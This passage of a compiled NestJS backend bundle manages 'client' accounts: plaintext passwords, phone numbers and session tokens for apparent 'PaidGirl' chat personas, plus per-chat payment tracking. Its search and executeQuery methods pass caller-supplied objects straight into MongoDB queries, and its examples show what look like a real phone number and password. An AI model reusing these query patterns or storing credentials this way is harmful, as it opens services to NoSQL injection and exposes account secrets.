    (0, common_1.Controller)('client'),
    __metadata("design:paramtypes", [client_service_1.ClientService])
], ClientController);


/***/ }),

/***/ "./nest/components/clients/client.module.ts":
/*!**************************************************!*\
  !*** ./nest/components/clients/client.module.ts ***!
  \**************************************************/
/***/ (function(__unused_webpack_module, exports, __webpack_require__) {


var __decorate = (this && this.__decorate) || function (decorators, target, key, desc) {
    var c = arguments.length, r = c < 3 ? target : desc === null ? desc = Object.getOwnPropertyDescriptor(target, key) : desc, d;
    if (typeof Reflect === "object" && typeof Reflect.decorate === "function") r = Reflect.decorate(decorators, target, key, desc);
    else for (var i = decorators.length - 1; i >= 0; i--) if (d = decorators[i]) r = (c < 3 ? d(r) : c > 3 ? d(target, key, r) : d(target, key)) || r;
    return c > 3 && r && Object.defineProperty(target, key, r), r;
};
Object.defineProperty(exports, "__esModule", ({ value: true }));
exports.ClientModule = void 0;
const common_1 = __webpack_require__(/*! @nestjs/common */ "@nestjs/common");
const mongoose_1 = __webpack_require__(/*! @nestjs/mongoose */ "@nestjs/mongoose");
const client_schema_1 = __webpack_require__(/*! ./schemas/client.schema */ "./nest/components/clients/schemas/client.schema.ts");
const client_service_1 = __webpack_require__(/*! ./client.service */ "./nest/components/clients/client.service.ts");
const client_controller_1 = __webpack_require__(/*! ./client.controller */ "./nest/components/clients/client.controller.ts");
let ClientModule = class ClientModule {
};
exports.ClientModule = ClientModule;
exports.ClientModule = ClientModule = __decorate([
    (0, common_1.Module)({
        imports: [mongoose_1.MongooseModule.forFeature([{ name: client_schema_1.Client.name, schema: client_schema_1.ClientSchema }])],
        controllers: [client_controller_1.ClientController],
        providers: [client_service_1.ClientService],
    })
], ClientModule);


/***/ }),

/***/ "./nest/components/clients/client.service.ts":
/*!***************************************************!*\
  !*** ./nest/components/clients/client.service.ts ***!
  \***************************************************/
/***/ (function(__unused_webpack_module, exports, __webpack_require__) {


var __decorate = (this && this.__decorate) || function (decorators, target, key, desc) {
    var c = arguments.length, r = c < 3 ? target : desc === null ? desc = Object.getOwnPropertyDescriptor(target, key) : desc, d;
    if (typeof Reflect === "object" && typeof Reflect.decorate === "function") r = Reflect.decorate(decorators, target, key, desc);
    else for (var i = decorators.length - 1; i >= 0; i--) if (d = decorators[i]) r = (c < 3 ? d(r) : c > 3 ? d(target, key, r) : d(target, key)) || r;
    return c > 3 && r && Object.defineProperty(target, key, r), r;
};
var __metadata = (this && this.__metadata) || function (k, v) {
    if (typeof Reflect === "object" && typeof Reflect.metadata === "function") return Reflect.metadata(k, v);
};
var __param = (this && this.__param) || function (paramIndex, decorator) {
    return function (target, key) { decorator(target, key, paramIndex); }
};
var __awaiter = (this && this.__awaiter) || function (thisArg, _arguments, P, generator) {
    function adopt(value) { return value instanceof P ? value : new P(function (resolve) { resolve(value); }); }
    return new (P || (P = Promise))(function (resolve, reject) {
        function fulfilled(value) { try { step(generator.next(value)); } catch (e) { reject(e); } }
        function rejected(value) { try { step(generator["throw"](value)); } catch (e) { reject(e); } }
        function step(result) { result.done ? resolve(result.value) : adopt(result.value).then(fulfilled, rejected); }
        step((generator = generator.apply(thisArg, _arguments || [])).next());
    });
};
Object.defineProperty(exports, "__esModule", ({ value: true }));
exports.ClientService = void 0;
const common_1 = __webpack_require__(/*! @nestjs/common */ "@nestjs/common");
const mongoose_1 = __webpack_require__(/*! @nestjs/mongoose */ "@nestjs/mongoose");
const mongoose_2 = __webpack_require__(/*! mongoose */ "mongoose");
const client_schema_1 = __webpack_require__(/*! ./schemas/client.schema */ "./nest/components/clients/schemas/client.schema.ts");
let ClientService = class ClientService {
    constructor(clientModel) {
        this.clientModel = clientModel;
        this.clientsMap = new Map();
    }
    create(createClientDto) {
        return __awaiter(this, void 0, void 0, function* () {
            const createdUser = new this.clientModel(createClientDto);
            return createdUser.save();
        });
    }
    findAll() {
        return __awaiter(this, void 0, void 0, function* () {
            if (this.clientsMap.size < 3) {
                const results = yield this.clientModel.find().exec();
                for (const client of results) {
                    this.clientsMap.set(client.clientId, client);
                }
                return results;
            }
            else {
                return Array.from(this.clientsMap.values());
            }
        });
    }
    findOne(clientId) {
        return __awaiter(this, void 0, void 0, function* () {
            const client = this.clientsMap.get(clientId);
            if (client) {
                return client;
            }
            else {
                const user = yield this.clientModel.findOne({ clientId }).exec();
                this.clientsMap.set(clientId, user);
                if (!user) {
                    throw new common_1.NotFoundException(`Client with ID "${clientId}" not found`);
                }
                return user;
            }
        });
    }
    update(clientId, updateClientDto) {
        return __awaiter(this, void 0, void 0, function* () {
            delete updateClientDto['_id'];
            const updatedUser = yield this.clientModel.findOneAndUpdate({ clientId }, { $set: updateClientDto }, { new: true }).exec();
            this.clientsMap.set(clientId, updatedUser);
            if (!updatedUser) {
                throw new common_1.NotFoundException(`Client with ID "${clientId}" not found`);
            }
            return updatedUser;
        });
    }
    remove(clientId) {
        return __awaiter(this, void 0, void 0, function* () {
            const deletedUser = yield this.clientModel.findOneAndDelete({ clientId }).exec();
            if (!deletedUser) {
                throw new common_1.NotFoundException(`Client with ID "${clientId}" not found`);
            }
            return deletedUser;
        });
    }
    search(filter) {
        return __awaiter(this, void 0, void 0, function* () {
            console.log(filter);
            if (filter.firstName) {
                filter.firstName = { $regex: new RegExp(filter.firstName, 'i') };
            }
            console.log(filter);
            return this.clientModel.find(filter).exec();
        });
    }
    executeQuery(query) {
        return __awaiter(this, void 0, void 0, function* () {
            try {
                if (!query) {
                    throw new common_1.BadRequestException('Query is invalid.');
                }
                return yield this.clientModel.find(query).exec();
            }
            catch (error) {
                throw new common_1.InternalServerErrorException(error.message);
            }
        });
    }
};
exports.ClientService = ClientService;
exports.ClientService = ClientService = __decorate([
    (0, common_1.Injectable)(),
    __param(0, (0, mongoose_1.InjectModel)(client_schema_1.Client.name)),
    __metadata("design:paramtypes", [mongoose_2.Model])
], ClientService);


/***/ }),

/***/ "./nest/components/clients/dto/create-client.dto.ts":
/*!**********************************************************!*\
  !*** ./nest/components/clients/dto/create-client.dto.ts ***!
  \**********************************************************/
/***/ (function(__unused_webpack_module, exports, __webpack_require__) {


var __decorate = (this && this.__decorate) || function (decorators, target, key, desc) {
    var c = arguments.length, r = c < 3 ? target : desc === null ? desc = Object.getOwnPropertyDescriptor(target, key) : desc, d;
    if (typeof Reflect === "object" && typeof Reflect.decorate === "function") r = Reflect.decorate(decorators, target, key, desc);
    else for (var i = decorators.length - 1; i >= 0; i--) if (d = decorators[i]) r = (c < 3 ? d(r) : c > 3 ? d(target, key, r) : d(target, key)) || r;
    return c > 3 && r && Object.defineProperty(target, key, r), r;
};
var __metadata = (this && this.__metadata) || function (k, v) {
    if (typeof Reflect === "object" && typeof Reflect.metadata === "function") return Reflect.metadata(k, v);
};
Object.defineProperty(exports, "__esModule", ({ value: true }));
exports.CreateClientDto = void 0;
const swagger_1 = __webpack_require__(/*! @nestjs/swagger */ "@nestjs/swagger");
class CreateClientDto {
}
exports.CreateClientDto = CreateClientDto;
__decorate([
    (0, swagger_1.ApiProperty)({ example: 'paid_giirl_shruthiee', description: 'Channel link of the user' }),
    __metadata("design:type", String)
], CreateClientDto.prototype, "channelLink", void 0);
__decorate([
    (0, swagger_1.ApiProperty)({ example: 'shruthi', description: 'Database collection name' }),
    __metadata("design:type", String)
], CreateClientDto.prototype, "dbcoll", void 0);
__decorate([
    (0, swagger_1.ApiProperty)({ example: 'PaidGirl.netlify.app/Shruthi1', description: 'Link of the user' }),
    __metadata("design:type", String)
], CreateClientDto.prototype, "link", void 0);
__decorate([
    (0, swagger_1.ApiProperty)({ example: 'Shruthi Reddy', description: 'Name of the user' }),
    __metadata("design:type", String)
], CreateClientDto.prototype, "name", void 0);
__decorate([
    (0, swagger_1.ApiProperty)({ example: '+916265240911', description: 'Phone number of the user' }),
    __metadata("design:type", String)
], CreateClientDto.prototype, "number", void 0);
__decorate([
    (0, swagger_1.ApiProperty)({ example: 'Ajtdmwajt1@', description: 'Password of the user' }),
    __metadata("design:type", String)
], CreateClientDto.prototype, "password", void 0);
__decorate([
    (0, swagger_1.ApiProperty)({ example: 'https://shruthi1.glitch.me', description: 'Repl link of the user' }),
    __metadata("design:type", String)
], CreateClientDto.prototype, "repl", void 0);
__decorate([
    (0, swagger_1.ApiProperty)({ example: '1BQANOTEuMTA4LjUg==', description: 'Session token' }),
    __metadata("design:type", String)
], CreateClientDto.prototype, "session", void 0);
__decorate([
    (0, swagger_1.ApiProperty)({ example: 'ShruthiRedd2', description: 'Username of the user' }),
    __metadata("design:type", String)
], CreateClientDto.prototype, "userName", void 0);
__decorate([
    (0, swagger_1.ApiProperty)({ example: 'shruthi1', description: 'Client ID of the user' }),
    __metadata("design:type", String)
], CreateClientDto.prototype, "clientId", void 0);
__decorate([
    (0, swagger_1.ApiProperty)({ example: 'https://shruthi1.glitch.me/exit', description: 'Deployment key URL' }),
    __metadata("design:type", String)
], CreateClientDto.prototype, "deployKey", void 0);
__decorate([
    (0, swagger_1.ApiProperty)({ example: 'ShruthiRedd2', description: 'Main account of the user' }),
    __metadata("design:type", String)
], CreateClientDto.prototype, "mainAccount", void 0);
__decorate([
    (0, swagger_1.ApiProperty)({ example: 'booklet_10', description: 'Product associated with the user' }),
    __metadata("design:type", String)
], CreateClientDto.prototype, "product", void 0);


/***/ }),

/***/ "./nest/components/clients/dto/search-client.dto.ts":
/*!**********************************************************!*\
  !*** ./nest/components/clients/dto/search-client.dto.ts ***!
  \**********************************************************/
/***/ (function(__unused_webpack_module, exports, __webpack_require__) {


var __decorate = (this && this.__decorate) || function (decorators, target, key, desc) {
    var c = arguments.length, r = c < 3 ? target : desc === null ? desc = Object.getOwnPropertyDescriptor(target, key) : desc, d;
    if (typeof Reflect === "object" && typeof Reflect.decorate === "function") r = Reflect.decorate(decorators, target, key, desc);
    else for (var i = decorators.length - 1; i >= 0; i--) if (d = decorators[i]) r = (c < 3 ? d(r) : c > 3 ? d(target, key, r) : d(target, key)) || r;
    return c > 3 && r && Object.defineProperty(target, key, r), r;
};
var __metadata = (this && this.__metadata) || function (k, v) {
    if (typeof Reflect === "object" && typeof Reflect.metadata === "function") return Reflect.metadata(k, v);
};
Object.defineProperty(exports, "__esModule", ({ value: true }));
exports.SearchClientDto = void 0;
const swagger_1 = __webpack_require__(/*! @nestjs/swagger */ "@nestjs/swagger");
const class_transformer_1 = __webpack_require__(/*! class-transformer */ "class-transformer");
class SearchClientDto {
}
exports.SearchClientDto = SearchClientDto;
__decorate([
    (0, swagger_1.ApiPropertyOptional)({ description: 'Client ID of the client' }),
    (0, class_transformer_1.Transform)(({ value }) => value === null || value === void 0 ? void 0 : value.trim().toLowerCase()),
    __metadata("design:type", String)
], SearchClientDto.prototype, "clientId", void 0);
__decorate([
    (0, swagger_1.ApiPropertyOptional)({ description: 'Database collection name' }),
    (0, class_transformer_1.Transform)(({ value }) => value === null || value === void 0 ? void 0 : value.trim().toLowerCase()),
    __metadata("design:type", String)
], SearchClientDto.prototype, "dbcoll", void 0);
__decorate([
    (0, swagger_1.ApiPropertyOptional)({ description: 'Channel link of the client' }),
    __metadata("design:type", String)
], SearchClientDto.prototype, "channelLink", void 0);
__decorate([
    (0, swagger_1.ApiPropertyOptional)({ description: 'Link of the client' }),
    __metadata("design:type", String)
], SearchClientDto.prototype, "link", void 0);
__decorate([
    (0, swagger_1.ApiPropertyOptional)({ description: 'Name of the client' }),
    __metadata("design:type", String)
], SearchClientDto.prototype, "name", void 0);
__decorate([
    (0, swagger_1.ApiPropertyOptional)({ description: 'Phone number of the client' }),
    __metadata("design:type", String)
], SearchClientDto.prototype, "number", void 0);
__decorate([
    (0, swagger_1.ApiPropertyOptional)({ description: 'Password of the client' }),
    __metadata("design:type", String)
], SearchClientDto.prototype, "password", void 0);
__decorate([
    (0, swagger_1.ApiPropertyOptional)({ description: 'Repl link of the client' }),
    __metadata("design:type", String)
], SearchClientDto.prototype, "repl", void 0);
__decorate([
    (0, swagger_1.ApiPropertyOptional)({ description: 'Clientname of the client' }),
    __metadata("design:type", String)
], SearchClientDto.prototype, "clientName", void 0);
__decorate([
    (0, swagger_1.ApiPropertyOptional)({ description: 'Deployment key URL' }),
    __metadata("design:type", String)
], SearchClientDto.prototype, "deployKey", void 0);
__decorate([
    (0, swagger_1.ApiPropertyOptional)({ description: 'Main account of the client' }),
    (0, class_transformer_1.Transform)(({ value }) => value === null || value === void 0 ? void 0 : value.trim().toLowerCase()),
    __metadata("design:type", String)
], SearchClientDto.prototype, "mainAccount", void 0);
__decorate([
    (0, swagger_1.ApiPropertyOptional)({ description: 'Product associated with the client' }),
    __metadata("design:type", String)
], SearchClientDto.prototype, "product", void 0);


/***/ }),

/***/ "./nest/components/clients/schemas/client.schema.ts":
/*!**********************************************************!*\
  !*** ./nest/components/clients/schemas/client.schema.ts ***!
  \**********************************************************/
/***/ (function(__unused_webpack_module, exports, __webpack_require__) {


var __decorate = (this && this.__decorate) || function (decorators, target, key, desc) {
    var c = arguments.length, r = c < 3 ? target : desc === null ? desc = Object.getOwnPropertyDescriptor(target, key) : desc, d;
    if (typeof Reflect === "object" && typeof Reflect.decorate === "function") r = Reflect.decorate(decorators, target, key, desc);
    else for (var i = decorators.length - 1; i >= 0; i--) if (d = decorators[i]) r = (c < 3 ? d(r) : c > 3 ? d(target, key, r) : d(target, key)) || r;
    return c > 3 && r && Object.defineProperty(target, key, r), r;
};
var __metadata = (this && this.__metadata) || function (k, v) {
    if (typeof Reflect === "object" && typeof Reflect.metadata === "function") return Reflect.metadata(k, v);
};
Object.defineProperty(exports, "__esModule", ({ value: true }));
exports.ClientSchema = exports.Client = void 0;
const mongoose_1 = __webpack_require__(/*! @nestjs/mongoose */ "@nestjs/mongoose");
const swagger_1 = __webpack_require__(/*! @nestjs/swagger */ "@nestjs/swagger");
let Client = class Client {
};
exports.Client = Client;
__decorate([
    (0, swagger_1.ApiProperty)({ example: 'paid_giirl_shruthiee', description: 'Channel link of the user' }),
    (0, mongoose_1.Prop)({ required: true }),
    __metadata("design:type", String)
], Client.prototype, "channelLink", void 0);
__decorate([
    (0, swagger_1.ApiProperty)({ example: 'shruthi', description: 'Database collection name' }),
    (0, mongoose_1.Prop)({ required: true }),
    __metadata("design:type", String)
], Client.prototype, "dbcoll", void 0);
__decorate([
    (0, swagger_1.ApiProperty)({ example: 'PaidGirl.netlify.app/Shruthi1', description: 'Link of the user' }),
    (0, mongoose_1.Prop)({ required: true }),
    __metadata("design:type", String)
], Client.prototype, "link", void 0);
__decorate([
    (0, swagger_1.ApiProperty)({ example: 'Shruthi Reddy', description: 'Name of the user' }),
    (0, mongoose_1.Prop)({ required: true }),
    __metadata("design:type", String)
], Client.prototype, "name", void 0);
__decorate([
    (0, swagger_1.ApiProperty)({ example: '+916265240911', description: 'Phone number of the user' }),
    (0, mongoose_1.Prop)({ required: true }),
    __metadata("design:type", String)
], Client.prototype, "number", void 0);
__decorate([
    (0, swagger_1.ApiProperty)({ example: 'Ajtdmwajt1@', description: 'Password of the user' }),
    (0, mongoose_1.Prop)({ required: true }),
    __metadata("design:type", String)
], Client.prototype, "password", void 0);
__decorate([
    (0, swagger_1.ApiProperty)({ example: 'https://shruthi1.glitch.me', description: 'Repl link of the user' }),
    (0, mongoose_1.Prop)({ required: true }),
    __metadata("design:type", String)
], Client.prototype, "repl", void 0);
__decorate([
    (0, swagger_1.ApiProperty)({ example: '1BQANOTEuM==', description: 'Session token' }),
    (0, mongoose_1.Prop)({ required: true }),
    __metadata("design:type", String)
], Client.prototype, "session", void 0);
__decorate([
    (0, swagger_1.ApiProperty)({ example: 'ShruthiRedd2', description: 'Username of the user' }),
    (0, mongoose_1.Prop)({ required: true }),
    __metadata("design:type", String)
], Client.prototype, "userName", void 0);
__decorate([
    (0, swagger_1.ApiProperty)({ example: 'shruthi1', description: 'Client ID of the user' }),
    (0, mongoose_1.Prop)({ required: true }),
    __metadata("design:type", String)
], Client.prototype, "clientId", void 0);
__decorate([
    (0, swagger_1.ApiProperty)({ example: 'https://shruthi1.glitch.me/exit', description: 'Deployment key URL' }),
    (0, mongoose_1.Prop)({ required: true }),
    __metadata("design:type", String)
], Client.prototype, "deployKey", void 0);
__decorate([
    (0, swagger_1.ApiProperty)({ example: 'ShruthiRedd2', description: 'Main account of the user' }),
    (0, mongoose_1.Prop)({ required: true }),
    __metadata("design:type", String)
], Client.prototype, "mainAccount", void 0);
__decorate([
    (0, swagger_1.ApiProperty)({ example: 'booklet_10', description: 'Product associated with the user' }),
    (0, mongoose_1.Prop)({ required: true }),
    __metadata("design:type", String)
], Client.prototype, "product", void 0);
exports.Client = Client = __decorate([
    (0, mongoose_1.Schema)({ collection: 'clients', versionKey: false, autoIndex: true })
], Client);
exports.ClientSchema = mongoose_1.SchemaFactory.createForClass(Client);


/***/ }),

/***/ "./nest/components/confguration/configuration.controller.ts":
/*!******************************************************************!*\
  !*** ./nest/components/confguration/configuration.controller.ts ***!
  \******************************************************************/
/***/ (function(__unused_webpack_module, exports, __webpack_require__) {


var __decorate = (this && this.__decorate) || function (decorators, target, key, desc) {
    var c = arguments.length, r = c < 3 ? target : desc === null ? desc = Object.getOwnPropertyDescriptor(target, key) : desc, d;
    if (typeof Reflect === "object" && typeof Reflect.decorate === "function") r = Reflect.decorate(decorators, target, key, desc);
    else for (var i = decorators.length - 1; i >= 0; i--) if (d = decorators[i]) r = (c < 3 ? d(r) : c > 3 ? d(target, key, r) : d(target, key)) || r;
    return c > 3 && r && Object.defineProperty(target, key, r), r;
};
var __metadata = (this && this.__metadata) || function (k, v) {
    if (typeof Reflect === "object" && typeof Reflect.metadata === "function") return Reflect.metadata(k, v);
};
var __param = (this && this.__param) || function (paramIndex, decorator) {
    return function (target, key) { decorator(target, key, paramIndex); }
};
var __awaiter = (this && this.__awaiter) || function (thisArg, _arguments, P, generator) {
    function adopt(value) { return value instanceof P ? value : new P(function (resolve) { resolve(value); }); }
    return new (P || (P = Promise))(function (resolve, reject) {
        function fulfilled(value) { try { step(generator.next(value)); } catch (e) { reject(e); } }
        function rejected(value) { try { step(generator["throw"](value)); } catch (e) { reject(e); } }
        function step(result) { result.done ? resolve(result.value) : adopt(result.value).then(fulfilled, rejected); }
        step((generator = generator.apply(thisArg, _arguments || [])).next());
    });
};
Object.defineProperty(exports, "__esModule", ({ value: true }));
exports.ConfigurationController = void 0;
const common_1 = __webpack_require__(/*! @nestjs/common */ "@nestjs/common");
const swagger_1 = __webpack_require__(/*! @nestjs/swagger */ "@nestjs/swagger");
const configuration_service_1 = __webpack_require__(/*! ./configuration.service */ "./nest/components/confguration/configuration.service.ts");
let ConfigurationController = class ConfigurationController {
    constructor(configurationService) {
        this.configurationService = configurationService;
    }
    findOne() {
        return __awaiter(this, void 0, void 0, function* () {
            return this.configurationService.findOne();
        });
    }
    update(updateClientDto) {
        return __awaiter(this, void 0, void 0, function* () {
            return this.configurationService.update(updateClientDto);
        });
    }
};
exports.ConfigurationController = ConfigurationController;
__decorate([
    (0, common_1.Get)(),
    (0, swagger_1.ApiOperation)({ summary: 'Get configuration data' }),
    __metadata("design:type", Function),
    __metadata("design:paramtypes", []),
    __metadata("design:returntype", Promise)
], ConfigurationController.prototype, "findOne", null);
__decorate([
    (0, common_1.Patch)(),
    (0, swagger_1.ApiOperation)({ summary: 'Update configuration' }),
    (0, swagger_1.ApiBody)({ type: Object }),
    __param(0, (0, common_1.Body)()),
    __metadata("design:type", Function),
    __metadata("design:paramtypes", [Object]),
    __metadata("design:returntype", Promise)
], ConfigurationController.prototype, "update", null);
exports.ConfigurationController = ConfigurationController = __decorate([
    (0, swagger_1.ApiTags)('Configuration'),
    (0, common_1.Controller)('Configuration'),
    __metadata("design:paramtypes", [configuration_service_1.ConfigurationService])
], ConfigurationController);


/***/ }),

/***/ "./nest/components/confguration/configuration.module.ts":
/*!**************************************************************!*\
  !*** ./nest/components/confguration/configuration.module.ts ***!
  \**************************************************************/
/***/ (function(__unused_webpack_module, exports, __webpack_require__) {


var __decorate = (this && this.__decorate) || function (decorators, target, key, desc) {
    var c = arguments.length, r = c < 3 ? target : desc === null ? desc = Object.getOwnPropertyDescriptor(target, key) : desc, d;
    if (typeof Reflect === "object" && typeof Reflect.decorate === "function") r = Reflect.decorate(decorators, target, key, desc);
    else for (var i = decorators.length - 1; i >= 0; i--) if (d = decorators[i]) r = (c < 3 ? d(r) : c > 3 ? d(target, key, r) : d(target, key)) || r;
    return c > 3 && r && Object.defineProperty(target, key, r), r;
};
Object.defineProperty(exports, "__esModule", ({ value: true }));
exports.ConfigurationModule = void 0;
const common_1 = __webpack_require__(/*! @nestjs/common */ "@nestjs/common");
const mongoose_1 = __webpack_require__(/*! @nestjs/mongoose */ "@nestjs/mongoose");
const configuration_controller_1 = __webpack_require__(/*! ./configuration.controller */ "./nest/components/confguration/configuration.controller.ts");
const configuration_service_1 = __webpack_require__(/*! ./configuration.service */ "./nest/components/confguration/configuration.service.ts");
const configuration_schema_1 = __webpack_require__(/*! ./configuration.schema */ "./nest/components/confguration/configuration.schema.ts");
let ConfigurationModule = class ConfigurationModule {
};
exports.ConfigurationModule = ConfigurationModule;
exports.ConfigurationModule = ConfigurationModule = __decorate([
    (0, common_1.Module)({
        imports: [mongoose_1.MongooseModule.forFeature([{
                    name: 'configurationModule', collection: 'configuration', schema: configuration_schema_1.ConfigurationSchema
                }])],
        controllers: [configuration_controller_1.ConfigurationController],
        providers: [configuration_service_1.ConfigurationService],
    })
], ConfigurationModule);


/***/ }),

/***/ "./nest/components/confguration/configuration.schema.ts":
/*!**************************************************************!*\
  !*** ./nest/components/confguration/configuration.schema.ts ***!
  \**************************************************************/
/***/ (function(__unused_webpack_module, exports, __webpack_require__) {


var __decorate = (this && this.__decorate) || function (decorators, target, key, desc) {
    var c = arguments.length, r = c < 3 ? target : desc === null ? desc = Object.getOwnPropertyDescriptor(target, key) : desc, d;
    if (typeof Reflect === "object" && typeof Reflect.decorate === "function") r = Reflect.decorate(decorators, target, key, desc);
    else for (var i = decorators.length - 1; i >= 0; i--) if (d = decorators[i]) r = (c < 3 ? d(r) : c > 3 ? d(target, key, r) : d(target, key)) || r;
    return c > 3 && r && Object.defineProperty(target, key, r), r;
};
var __importDefault = (this && this.__importDefault) || function (mod) {
    return (mod && mod.__esModule) ? mod : { "default": mod };
};
Object.defineProperty(exports, "__esModule", ({ value: true }));
exports.ConfigurationSchema = exports.Configuration = void 0;
const mongoose_1 = __webpack_require__(/*! @nestjs/mongoose */ "@nestjs/mongoose");
const mongoose_2 = __importDefault(__webpack_require__(/*! mongoose */ "mongoose"));
let Configuration = class Configuration {
};
exports.Configuration = Configuration;
exports.Configuration = Configuration = __decorate([
    (0, mongoose_1.Schema)({ versionKey: false, autoIndex: true, strict: false })
], Configuration);
exports.ConfigurationSchema = mongoose_1.SchemaFactory.createForClass(Configuration);
exports.ConfigurationSchema.add({ type: mongoose_2.default.Schema.Types.Mixed });


/***/ }),

/***/ "./nest/components/confguration/configuration.service.ts":
/*!***************************************************************!*\
  !*** ./nest/components/confguration/configuration.service.ts ***!
  \***************************************************************/
/***/ (function(__unused_webpack_module, exports, __webpack_require__) {


var __decorate = (this && this.__decorate) || function (decorators, target, key, desc) {
    var c = arguments.length, r = c < 3 ? target : desc === null ? desc = Object.getOwnPropertyDescriptor(target, key) : desc, d;
    if (typeof Reflect === "object" && typeof Reflect.decorate === "function") r = Reflect.decorate(decorators, target, key, desc);
    else for (var i = decorators.length - 1; i >= 0; i--) if (d = decorators[i]) r = (c < 3 ? d(r) : c > 3 ? d(target, key, r) : d(target, key)) || r;
    return c > 3 && r && Object.defineProperty(target, key, r), r;
};
var __metadata = (this && this.__metadata) || function (k, v) {
    if (typeof Reflect === "object" && typeof Reflect.metadata === "function") return Reflect.metadata(k, v);
};
var __param = (this && this.__param) || function (paramIndex, decorator) {
    return function (target, key) { decorator(target, key, paramIndex); }
};
var __awaiter = (this && this.__awaiter) || function (thisArg, _arguments, P, generator) {
    function adopt(value) { return value instanceof P ? value : new P(function (resolve) { resolve(value); }); }
    return new (P || (P = Promise))(function (resolve, reject) {
        function fulfilled(value) { try { step(generator.next(value)); } catch (e) { reject(e); } }
        function rejected(value) { try { step(generator["throw"](value)); } catch (e) { reject(e); } }
        function step(result) { result.done ? resolve(result.value) : adopt(result.value).then(fulfilled, rejected); }
        step((generator = generator.apply(thisArg, _arguments || [])).next());
    });
};
Object.defineProperty(exports, "__esModule", ({ value: true }));
exports.ConfigurationService = void 0;
const common_1 = __webpack_require__(/*! @nestjs/common */ "@nestjs/common");
const mongoose_1 = __webpack_require__(/*! @nestjs/mongoose */ "@nestjs/mongoose");
const mongoose_2 = __webpack_require__(/*! mongoose */ "mongoose");
let ConfigurationService = class ConfigurationService {
    constructor(configurationModel) {
        this.configurationModel = configurationModel;
    }
    findOne() {
        return __awaiter(this, void 0, void 0, function* () {
            const user = yield this.configurationModel.findOne({}).exec();
            if (!user) {
                throw new common_1.NotFoundException(`configurationModel not found`);
            }
            return user;
        });
    }
    update(updateClientDto) {
        return __awaiter(this, void 0, void 0, function* () {
            delete updateClientDto['_id'];
            const updatedUser = yield this.configurationModel.findOneAndUpdate({}, // Assuming you want to update the first document found in the collection
            { $set: Object.assign({}, updateClientDto) }, { new: true, upsert: true }).exec();
            if (!updatedUser) {
                throw new common_1.NotFoundException(`configurationModel not found`);
            }
            return updatedUser;
        });
    }
};
exports.ConfigurationService = ConfigurationService;
exports.ConfigurationService = ConfigurationService = __decorate([
    (0, common_1.Injectable)(),
    __param(0, (0, mongoose_1.InjectModel)('configurationModule')),
    __metadata("design:paramtypes", [mongoose_2.Model])
], ConfigurationService);


/***/ }),

/***/ "./nest/components/user-data/dto/create-user-data.dto.ts":
/*!***************************************************************!*\
  !*** ./nest/components/user-data/dto/create-user-data.dto.ts ***!
  \***************************************************************/
/***/ (function(__unused_webpack_module, exports, __webpack_require__) {


var __decorate = (this && this.__decorate) || function (decorators, target, key, desc) {
    var c = arguments.length, r = c < 3 ? target : desc === null ? desc = Object.getOwnPropertyDescriptor(target, key) : desc, d;
    if (typeof Reflect === "object" && typeof Reflect.decorate === "function") r = Reflect.decorate(decorators, target, key, desc);
    else for (var i = decorators.length - 1; i >= 0; i--) if (d = decorators[i]) r = (c < 3 ? d(r) : c > 3 ? d(target, key, r) : d(target, key)) || r;
    return c > 3 && r && Object.defineProperty(target, key, r), r;
};
var __metadata = (this && this.__metadata) || function (k, v) {
    if (typeof Reflect === "object" && typeof Reflect.metadata === "function") return Reflect.metadata(k, v);
};
Object.defineProperty(exports, "__esModule", ({ value: true }));
exports.CreateUserDataDto = void 0;
const swagger_1 = __webpack_require__(/*! @nestjs/swagger */ "@nestjs/swagger");
class CreateUserDataDto {
}
exports.CreateUserDataDto = CreateUserDataDto;
__decorate([
    (0, swagger_1.ApiProperty)({ example: '5787751360', description: 'Chat ID' }),
    __metadata("design:type", String)
], CreateUserDataDto.prototype, "chatId", void 0);
__decorate([
    (0, swagger_1.ApiProperty)({ example: 1, description: 'Total count' }),
    __metadata("design:type", Number)
], CreateUserDataDto.prototype, "totalCount", void 0);
__decorate([
    (0, swagger_1.ApiProperty)({ example: 0, description: 'Picture count' }),
    __metadata("design:type", Number)
], CreateUserDataDto.prototype, "picCount", void 0);
__decorate([
    (0, swagger_1.ApiProperty)({ example: 1718802722566, description: 'Last message timestamp' }),
    __metadata("design:type", Number)
], CreateUserDataDto.prototype, "lastMsgTimeStamp", void 0);
__decorate([
    (0, swagger_1.ApiProperty)({ example: 1718802742567, description: 'Limit time' }),
    __metadata("design:type", Number)
], CreateUserDataDto.prototype, "limitTime", void 0);
__decorate([
    (0, swagger_1.ApiProperty)({ example: 0, description: 'Paid count' }),
    __metadata("design:type", Number)
], CreateUserDataDto.prototype, "paidCount", void 0);
__decorate([
    (0, swagger_1.ApiProperty)({ example: 0, description: 'Profile count' }),
    __metadata("design:type", Number)
], CreateUserDataDto.prototype, "prfCount", void 0);
__decorate([
    (0, swagger_1.ApiProperty)({ example: 1, description: 'Can reply' }),
    __metadata("design:type", Number)
], CreateUserDataDto.prototype, "canReply", void 0);
__decorate([
    (0, swagger_1.ApiProperty)({ example: 0, description: 'Pay amount' }),
    __metadata("design:type", Number)
], CreateUserDataDto.prototype, "payAmount", void 0);
__decorate([
    (0, swagger_1.ApiProperty)({ example: 'بـِـعٰ۬ێډ الۿٰٕقاوٰ۬ێ ٴ🦅', description: 'Username' }),
    __metadata("design:type", String)
], CreateUserDataDto.prototype, "username", void 0);
__decorate([
    (0, swagger_1.ApiProperty)({ example: '-7250939091939055173', description: 'Access hash' }),
    __metadata("design:type", String)
], CreateUserDataDto.prototype, "accessHash", void 0);
__decorate([
    (0, swagger_1.ApiProperty)({ example: true, description: 'Paid reply status' }),
    __metadata("design:type", Boolean)
], CreateUserDataDto.prototype, "paidReply", void 0);
__decorate([
    (0, swagger_1.ApiProperty)({ example: false, description: 'Demo given status' }),
    __metadata("design:type", Boolean)
], CreateUserDataDto.prototype, "demoGiven", void 0);
__decorate([
    (0, swagger_1.ApiProperty)({ example: false, description: 'Second show status' }),
    __metadata("design:type", Boolean)
], CreateUserDataDto.prototype, "secondShow", void 0);
__decorate([
    (0, swagger_1.ApiProperty)({ example: 'sneha', description: 'Profile name' }),
    __metadata("design:type", String)
], CreateUserDataDto.prototype, "profile", void 0);


/***/ }),

/***/ "./nest/components/user-data/dto/search-user-data.dto.ts":
/*!***************************************************************!*\
  !*** ./nest/components/user-data/dto/search-user-data.dto.ts ***!
  \***************************************************************/
/***/ (function(__unused_webpack_module, exports, __webpack_require__) {


var __decorate = (this && this.__decorate) || function (decorators, target, key, desc) {
    var c = arguments.length, r = c < 3 ? target : desc === null ? desc = Object.getOwnPropertyDescriptor(target, key) : desc, d;
